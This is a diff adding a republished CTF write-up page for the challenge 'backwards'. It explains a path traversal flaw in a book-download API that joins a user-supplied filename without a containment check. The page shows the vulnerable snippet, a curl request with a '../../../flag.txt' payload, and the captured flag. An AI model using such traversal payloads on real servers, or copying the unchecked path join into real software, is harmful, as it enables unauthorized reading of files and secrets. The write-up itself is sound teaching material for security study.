@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="The book-download API trusts a submitted filename. Parent-directory components escape the books directory and read the flag file.">
+  <title>backwards | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 2 / EASY</p>
+    <h1>backwards</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave2/pt/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>The book-download API trusts a submitted filename. Parent-directory components escape the books directory and read the flag file.</p>
+<h2>Root cause</h2>
+<p>The download endpoint builds a path from submitted input:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-javascript">const file = req.body.file;
+const filePath = path.join(BOOKS_DIR, file);
+res.sendFile(filePath, ...)
+</code></pre>
+<p>Path joining normalizes parent-directory components; it does not reject them. Because the result is never checked to ensure it is still inside <code>BOOKS_DIR</code>, a filename can escape to <code>/flag.txt.</code></p>
+<h2>Vulnerability</h2>
+<p>The download button sends a JSON filename to the server. Replacing a normal PDF name with parent-directory sequences is accepted, which reveals path traversal.</p>
+<h2>Exploit</h2>
+<p>Send the traversal filename directly:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">curl -s -X POST https://backwards.web2.friendly-ctf.securinets.tn/books/download \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;file&quot;:&quot;../../../flag.txt&quot;}'
+</code></pre>
+<p>Starting from the books directory, three parent-directory steps reach the filesystem root. The final resolved path is <code>/flag.txt</code>, and the response prints it.</p>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{p47h_tr4v3rs4l_lead1ng_t0_file_r34d}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave2">&larr; Back to Wave 2 writeups</a></p>
+  </main>
+</body>
+</html>
